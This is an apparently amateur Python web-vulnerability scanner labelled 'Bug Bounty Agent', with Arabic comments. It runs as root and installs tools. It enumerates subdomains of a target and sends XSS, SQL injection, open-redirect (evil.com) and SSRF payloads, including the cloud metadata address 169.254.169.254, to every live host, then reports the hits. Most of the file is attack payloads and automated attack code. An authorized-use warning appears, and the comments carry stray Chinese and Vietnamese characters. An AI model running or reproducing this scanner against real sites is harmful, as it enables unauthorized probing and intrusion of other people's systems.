#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bug Bounty Agent Unified - Kali Linux (Strict Root + Payloads)
ملف واحد موحد - يشترط صلاحيات روت عالية + أسكليتات اختبار متنوعة للترچت
⚠️ للاستخدام فقط على أنظمة تملكها أو لديك إذن كتابي صريح لاختبارها
"""

import sys
import os
import json
import subprocess
import importlib
import asyncio
import shutil
from datetime import datetime
from urllib.parse import urlparse, quote

# ============================================================
# الإعدادات والأدوات المطلوبة
# ============================================================

SYSTEM_PACKAGES = [
    "nmap",
    "chromium",
    "chromium-driver",
    "python3-pip",
    "libnss3",
    "libatk1.0-0",
    "libatk-bridge2.0-0",
    "libcups2",
    "libdrm2",
    "libxkbcommon0",
    "libxcomposite1",
    "libxdamage1",
    "libxfixes3",
    "libxrandr2",
    "libgbm1",
    "libasound2",
    "curl",
    "wget",
    "git",
]

GO_TOOLS = {
    "subfinder": "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
    "httpx": "github.com/projectdiscovery/httpx/cmd/httpx@latest",
    "nuclei": "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
}

REQUIRED_PYTHON_PACKAGES = {
    "requests": "requests",
    "httpx": "httpx",
    "beautifulsoup4": "bs4",
    "lxml": "lxml",
    "rich": "rich",
    "playwright": "playwright",
    "dnspython": "dns",
    "tldextract": "tldextract",
    "publicsuffix2": "publicsuffix2",
    "python-whois": "whois",
    "python-nmap": "nmap",
    "waybackpy": "waybackpy",
    "python-wappalyzer": "Wappalyzer",
    "colorama": "colorama",
    "tabulate": "tabulate",
    "fpdf2": "fpdf",
}

SCREENSHOT_DIR = "screenshots"
REPORTS_DIR = "reports"

# ============================================================
# أسكليتات الاختبار (Payloads) - آمنة وغير مدمرة
# ============================================================

# علامة مميزة نستخدمها عشان ن確認 لو البايلود反كس في الاستجابة
MARKER = "BugBountyAgentTest123"

# بايلوهات Reflected XSS
XSS_PAYLOADS = [
    f"<script>alert('{MARKER}')</script>",
    f"<img src=x onerror=alert('{MARKER}')>",
    f"<svg onload=alert('{MARKER}')>",
    f"<body onload=alert('{MARKER}')>",
    f"<iframe src=javascript:alert('{MARKER}')>",
    f"<details open ontoggle=alert('{MARKER}')>",
    f"<math><maction xlink:href='javascript:alert(\"{MARKER}\")'>",
    f"'--><script>alert('{MARKER}')</script>",
    f"\"><script>alert('{MARKER}')</script>",
    f"javascript:alert('{MARKER}')",
]

# بايلوهات DOM-Based XSS (لفحص المتصفح الحقيقي)
DOM_XSS_PAYLOADS = [
    f"<img src=x onerror=BugBountyAgentDOM>",
    f"<script>BugBountyAgentDOM</script>",
    f"<svg onload=BugBountyAgentDOM>",
    f"<body onload=BugBountyAgentDOM>",
]

# بايلوهات Open Redirect
OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "\\\\evil.com",
    "/\\/evil.com",
    "https://evil.com@google.com",
    "http://evil.com@google.com",
    "//google.com.evil.com",
    "https://google.com.evil.com",
]

# معلمات Open Redirect الشائعة
OPEN_REDIRECT_PARAMS = [
    "next", "url", "redirect", "return", "returnTo", "return_to",
    "goto", "link", "target", "dest", "destination", "redir",
    "r", "view", "image_url", "callback", "continue",
]

# بايلوهات SQLi (عينة آمنة للكشف فقط)
SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 1=1#",
    "\" OR 1=1#",
    "' UNION SELECT NULL--",
    "\" UNION SELECT NULL--",
    "AND 1=1",
    "OR 1=1",
    "' OR sleep(5)--",
    "\" OR sleep(5)--",
]

# أنماط أخطاء قواعد البيانات للكشف عن SQLi
SQL_ERROR_PATTERNS = [
    "sql syntax",
    "mysql_fetch",
    "you have an error in your sql syntax",
    "warning: mysql",
    "pg_query",
    "postgresql query failed",
    "ORA-009",
    "ORA-017",
    "microsoft ole db",
    "odbc sql server driver",
    "sqlserver jdbc driver",
    "sqlite3",
    "sqlite error",
    "unknown column",
    "supplied argument is not a valid mysql",
    "mysql_num_rows",
    "valid postgresql result",
]

# بايلوهات SSRF بسيطة للكشف عن refleksion (غير مدمرة)
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",
    "http://[::1]",
]

SSRF_PARAMS = [
    "url", "src", "uri", "link", "source", "target", "callback",
    "return", "redirect", "page", "file", "document", "folder",
]

# ============================================================
# الجزء الأول: اشتراط صلاحيات روت عالية (Strict Root)
# ============================================================

def require_root():
    if os.geteuid() != 0:
        print("=" * 60)
        print("[✗] خطأ: يجب تشغيل السكربت بصلاحيات الجذر (root) فقط.")
        print("[*] يرجى chạy التشغيل باستخدام sudo:")
        print(f"    sudo python3 {os.path.abspath(__file__)} [الرابط]")
        print("=" * 60)
        sys.exit(1)


def run_cmd(cmd, description=""):
    print(f"[+] {description}")
    try:
        subprocess.check_call(cmd, shell=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] فشل الأمر: {description} -> {e}")
        return False


def tool_exists(tool_name):
    return shutil.which(tool_name) is not None


# ------------------------------------------------------------------
# التشغيل الإجباري للروت قبل أي حاجة تانية
# ------------------------------------------------------------------

require_root()


# ============================================================
# الجزء الثاني: التركيب التلقائي للأدوات والمكتبات (فقط لو روت)
# ============================================================

def install_system_dependencies():
    print("=" * 60)
    print("   Bug Bounty Agent - تثبيت أدوات النظام (apt)")
    print("=" * 60)

    print("[+] تحديث قائمة الحزم (apt-get update) ...")
    run_cmd("apt-get update -y", "تحديث apt")

    pkgs = " ".join(SYSTEM_PACKAGES)
    print(f"[+] تركيب الحزم النظامية: {pkgs}")
    run_cmd(f"apt-get install -y {pkgs}", "تركيب الحزم النظامية")

    print("[✓] تم إنهاء تركيب أدوات النظام.")


def install_go_tools():
    print("\n" + "=" * 60)
    print("   فحص وتركيب أدوات Bug Bounty عبر Go")
    print("=" * 60)

    if not tool_exists("go"):
        print("[!] لغة Go غير مثبتة. يتم تخطي أدوات Go (subfinder, httpx, nuclei).")
        print("[*] لتركيب Go يدوياً: apt-get install -y golang-go")
        return

    try:
        gopath = subprocess.check_output(["go", "env", "GOPATH"], text=True).strip()
        go_bin = os.path.join(gopath, "bin")
        if go_bin not in os.environ.get("PATH", ""):
            os.environ["PATH"] = go_bin + os.pathsep + os.environ.get("PATH", "")
    except Exception:
        pass

    for tool, install_url in GO_TOOLS.items():
        if tool_exists(tool):
            print(f"[OK] {tool} مثبت بالفعل")
        else:
            print(f"[+] جاري تركيب {tool} عبر go install ...")
            try:
                subprocess.check_call(["go", "install", install_url])
                print(f"[✓] تم تركيب {tool}")
            except Exception as e:
                print(f"[!] فشل تركيب {tool}: {e}")


def is_python_installed(module_name):
    try:
        importlib.import_module(module_name)
        return True
    except ImportError:
        return False


def install_python_package(pip_name):
    print(f"[+] جاري تركيب مكتبة بايثون: {pip_name} ...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", pip_name])


def install_python_dependencies():
    print("\n" + "=" * 60)
    print("   فحص وتركيب مكتبات بايثون (pip)")
    print("=" * 60)

    missing = []
    for pip_name, module_name in REQUIRED_PYTHON_PACKAGES.items():
        if is_python_installed(module_name):
            print(f"[OK] {pip_name}")
        else:
            missing.append(pip_name)

    if missing:
        print(f"\n[-] توجد {len(missing)} مكتبة ناقصة، جاري التركيب...\n")
        for pkg in missing:
            install_python_package(pkg)
    else:
        print("\n[✓] جميع مكتبات بايثون مثبتة بالفعل!")

    print("\n[+] جاري تحميل متصفح Chromium لـ Playwright ...")
    try:
        subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])
        print("[✓] تم تحميل المتصفح بنجاح")
    except Exception as e:
        print(f"[!] تعذر تحميل المتصفح تلقائياً: {e}")
        print("[*] شغّل الأمر يدوياً: python -m playwright install chromium")


def ensure_directories():
    for d in [SCREENSHOT_DIR, REPORTS_DIR]:
        if not os.path.exists(d):
            os.makedirs(d)
            print(f"[+] تم إنشاء المجلد: {d}/")


# تشغيل التركيب التلقائي (فقط بعد تأكيد الروت)
install_system_dependencies()
install_go_tools()
install_python_dependencies()
ensure_directories()

print("\n[✓] اكتمال الإعداد. جميع الأدوات والمكتبات جاهزة.")
print("=" * 60 + "\n")

# ============================================================
# الجزء الثالث: استيراد المكتبات بعد التأكد من وجودها
# ============================================================

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import httpx as httpx_lib
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from playwright.async_api import async_playwright

console = Console()


class BugBountyAgent:
    def __init__(self, target):
        self.target = target.rstrip("/")
        self.domain = urlparse(self.target).netloc
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 BugBountyAgent/1.0 (Authorized Testing Only)"
        })

    def log(self, message, style="info"):
        styles = {"info": "cyan", "success": "green", "warn": "yellow", "danger": "red"}
        console.print(f"[{styles.get(style, 'white')}] {message}")

    def add_finding(self, title, url, severity, evidence):
        self.findings.append({
            "time": datetime.now().isoformat(),
            "title": title,
            "url": url,
            "severity": severity,
            "evidence": evidence
        })

    # ---------------------------------------------------------
    # المرحلة 1: جمع النطاقات الفرعية (crt.sh + subfinder لو متاح)
    # ---------------------------------------------------------
    def enumerate_subdomains(self):
        self.log(f"جاري جمع النطاقات الفرعية لـ {self.domain} ...", "info")
        subs = set()

        try:
            url = f"https://crt.sh/?q=%25.{self.domain}&output=json"
            r = self.session.get(url, timeout=20)
            if r.status_code == 200:
                data = r.json()
                for entry in data:
                    name = entry.get("name_value", "")
                    for n in name.split("\n"):
                        n = n.strip().lower()
                        if n and self.domain in n and "*" not in n:
                            subs.add(n)
        except Exception as e:
            self.log(f"فشل جمع من crt.sh: {e}", "warn")

        if tool_exists("subfinder"):
            try:
                self.log("جاري استخدام subfinder للمسح النشط ...", "info")
                result = subprocess.run(
                    ["subfinder", "-d", self.domain, "-silent"],
                    capture_output=True, text=True, timeout=90
                )
                for line in result.stdout.splitlines():
                    n = line.strip().lower()
                    if n and self.domain in n:
                        subs.add(n)
            except Exception as e:
                self.log(f"فشل subfinder: {e}", "warn")

        self.log(f"تم العثور على {len(subs)} نطاق فرعي", "success")
        for s in sorted(subs):
            console.print(f"  [dim]•[/dim] {s}")
        return sorted(subs)

    # ---------------------------------------------------------
    # المرحلة 2: التحقق من المضيفين النشطين (httpx لو متاح، وإلا requests)
    # ---------------------------------------------------------
    def probe_alive(self, subdomains):
        alive = []
        self.log(f"جاري فحص {len(subdomains)} مضيف ...", "info")

        if tool_exists("httpx"):
            try:
                hosts_input = "\n".join([self.domain] + subdomains)
                result = subprocess.run(
                    ["httpx", "-silent", "-status-code"],
                    input=hosts_input, text=True, capture_output=True, timeout=120
                )
                for line in result.stdout.splitlines():
                    if "[" in line:
                        url = line.split("[")[0].strip()
                        if url:
                            alive.append(url)
                            self.log(f"[+] {url}", "success")
                return alive
            except Exception as e:
                self.log(f"فشل httpx، الانتقال للفحص عبر requests: {e}", "warn")

        all_hosts = [self.domain] + subdomains
        for sub in all_hosts:
            for scheme in ["https", "http"]:
                url = f"{scheme}://{sub}"
                try:
                    r = self.session.get(url, timeout=6, allow_redirects=True, verify=False)
                    if r.status_code < 500:
                        alive.append(url)
                        self.log(f"[+] {url} -> {r.status_code}", "success")
                        break
                except Exception:
                    continue
        return alive

    # ---------------------------------------------------------
    # المرحلة 3: اختبار الثغرات باستخدام أسكليتات متنوعة
    # ---------------------------------------------------------
    def test_reflected_xss(self, url):
        self.log(f"جاري اختبار Reflected XSS على: {url}", "info")
        for payload in XSS_PAYLOADS:
            try:
                r = self.session.get(url, params={"q": payload}, timeout=10)
                if MARKER in r.text or payload in r.text:
                    self.add_finding("Reflected XSS (Parameter)", url, "High", f"البايلود反كس: {payload}")
                    self.log(f"[!] احتمالية Reflected XSS: {url}", "danger")
                    return  # لو لقي بايلود واحد يكفي
            except Exception as e:
                self.log(f"خطأ اختبار XSS على {url}: {e}", "warn")

        # تجربة البايلود في المسار (path)
        try:
            test_path = f"{url}/{quote(XSS_PAYLOADS[0])}"
            r = self.session.get(test_path, timeout=10)
            if MARKER in r.text or XSS_PAYLOADS[0] in r.text:
                self.add_finding("Reflected XSS (Path)", test_path, "High", "البايلود反كس في المسار")
                self.log(f"[!] احتمالية Reflected XSS في المسار: {test_path}", "danger")
        except Exception:
            pass

    def test_open_redirect(self, url):
        self.log(f"جاري اختبار Open Redirect على: {url}", "info")
        for param in OPEN_REDIRECT_PARAMS:
            for payload in OPEN_REDIRECT_PAYLOADS:
                try:
                    r = self.session.get(
                        url,
                        params={param: payload},
                        timeout=10,
                        allow_redirects=False
                    )
                    if r.status_code in (301, 302, 303, 307, 308):
                        loc = r.headers.get("Location", "")
                        if "evil.com" in loc or "google.com.evil.com" in loc:
                            self.add_finding("Open Redirect", url, "Medium", f"المعلمة: {param} → التوجيه إلى: {loc}")
                            self.log(f"[!] احتمالية Open Redirect: {url} (param: {param})", "danger")
                            return
                except Exception as e:
                    self.log(f"خطأ اختبار Open Redirect على {url}: {e}", "warn")

    def test_sqli(self, url):
        self.log(f"جاري اختبار SQL Injection على: {url}", "info")
        for payload in SQLI_PAYLOADS:
            try:
                r = self.session.get(url, params={"id": payload}, timeout=10)
                low = r.text.lower()
                for pattern in SQL_ERROR_PATTERNS:
                    if pattern.lower() in low:
                        self.add_finding("Possible SQL Injection", url, "High", f"البايلود: {payload}, النمط: {pattern}")
                        self.log(f"[!] احتمالية SQLi: {url}", "danger")
                        return
            except Exception:
                continue

    def test_ssrf_reflection(self, url):
        """فحص بسيط لانعكاس طلبات SSRF غير مدمرة"""
        self.log(f"جاري اختبار SSRF reflection على: {url}", "info")
        for param in SSRF_PARAMS:
            for payload in SSRF_PAYLOADS:
                try:
                    r = self.session.get(url, params={param: payload}, timeout=10)
                    if payload in r.text:
                        self.add_finding("Possible SSRF Reflection", url, "Medium", f"المعلمة: {param} → البايلود反كس: {payload}")
                        self.log(f"[!] احتمالية SSRF Reflection: {url}", "warn")
                        return
                except Exception:
                    continue

    # ---------------------------------------------------------
    # المرحلة 4: المراقبة بالمتصفح الحقيقي (Playwright)
    # ---------------------------------------------------------
    async def _scan_single(self, browser, url, payloads):
        result = {
            "url": url,
            "time": datetime.now().isoformat(),
            "console_logs": [],
            "page_errors": [],
            "dom_reflected": False,
            "screenshot": None,
        }

        context = await browser.new_context(
            user_agent="Mozilla/5.0 BugBountyAgent/1.0",
            ignore_https_errors=True,
        )
        page = await context.new_page()

        page.on("console", lambda msg: result["console_logs"].append(f"[{msg.type}] {msg.text}"))
        page.on("pageerror", lambda err: result["page_errors"].append(str(err)))

        try:
            await page.goto(url, wait_until="networkidle", timeout=20000)

            if payloads:
                for payload in payloads:
                    separator = "&" if "?" in url else "?"
                    test_url = f"{url}{separator}q={quote(payload)}"
                    try:
                        await page.goto(test_url, wait_until="domcontentloaded", timeout=15000)
                        await asyncio.sleep(1.5)
                        content = await page.content()
                        if "BugBountyAgentDOM" in content or payload in content:
                            result["dom_reflected"] = True
                            self.add_finding(
                                "DOM-Based XSS (Possible)", test_url, "High",
                                f"تم عكس البايلود في الـ DOM: {payload}"
                            )
                            self.log(f"[!] DOM-Based XSS محتمل: {test_url}", "danger")

                            safe = (
                                urlparse(test_url).netloc.replace(".", "_")
                                + (urlparse(test_url).path or "_").replace("/", "_")
                            )[:80]
                            shot_path = f"{SCREENSHOT_DIR}/{safe}.png"
                            await page.screenshot(path=shot_path, full_page=True)
                            result["screenshot"] = shot_path
                            self.log(f"[+] لقطة شاشة محفوظة: {shot_path}", "success")
                            break
                    except Exception as e:
                        result["console_logs"].append(f"[PAYLOAD ERROR] {e}")
        except Exception as e:
            result["console_logs"].append(f"[NAVIGATION ERROR] {e}")
        finally:
            await context.close()

        return result

    async def browser_scan_all(self, targets_with_payloads):
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            tasks = [
                self._scan_single(browser, url, payloads)
                for url, payloads in targets_with_payloads
            ]
            results = await asyncio.gather(*tasks)
            await browser.close()
        return results

    # ---------------------------------------------------------
    # المرحلة 5: التقارير (JSON + جدول)
    # ---------------------------------------------------------
    def generate_report(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report = {
            "target": self.target,
            "scan_date": datetime.now().isoformat(),
            "total_findings": len(self.findings),
            "findings": self.findings
        }

        json_path = f"{REPORTS_DIR}/report_{timestamp}.json"
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        self.log(f"تم حفظ التقرير: {json_path}", "success")

        table = Table(title="ملخص نتائج الفحص")
        table.add_column("الشدة", style="bold")
        table.add_column("العنوان")
        table.add_column("الرابط")
        sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
        for f in sorted(self.findings, key=lambda x: sev_order.get(x["severity"], 9)):
            table.add_row(f["severity"], f["title"], f["url"])
        console.print(table)

        return json_path

    # ---------------------------------------------------------
    # التشغيل الرئيسي
    # ---------------------------------------------------------
    def run(self):
        console.print(Panel.fit(
            "[bold red]⚠️  للاستخدام المصرح به فقط[/bold red]\n"
            "تشغيل فقط على أنظمة تملكها أو لديك إذن كتابي لاختبارها.",
            border_style="red"
        ))

        subs = self.enumerate_subdomains()
        all_hosts = [self.target] + subs

        alive = self.probe_alive(all_hosts)
        console.print(f"\n[bold]المضيفون النشطون:[/bold] {len(alive)}")

        for url in alive:
            self.test_reflected_xss(url)
            self.test_open_redirect(url)
            self.test_sqli(url)
            self.test_ssrf_reflection(url)

        self.log("بدء المراقبة بالمتصفح الحقيقي ...", "info")
        targets_browser = [(url, DOM_XSS_PAYLOADS) for url in alive[:10]]
        if targets_browser:
            asyncio.run(self.browser_scan_all(targets_browser))

        self.generate_report()
        console.print("\n[✓] تم الانتهاء من الفحص بنجاح!")


def main():
    if len(sys.argv) < 2:
        target = input("أدخل الرابط المستهدف (مثال: https://example.com): ").strip()
    else:
        target = sys.argv[1]

    if not target:
        console.print("لم يتم إدخال رابط. الخروج.", style="red")
        sys.exit(1)

    agent = BugBountyAgent(target)
    agent.run()


if __name__ == "__main__":
    main()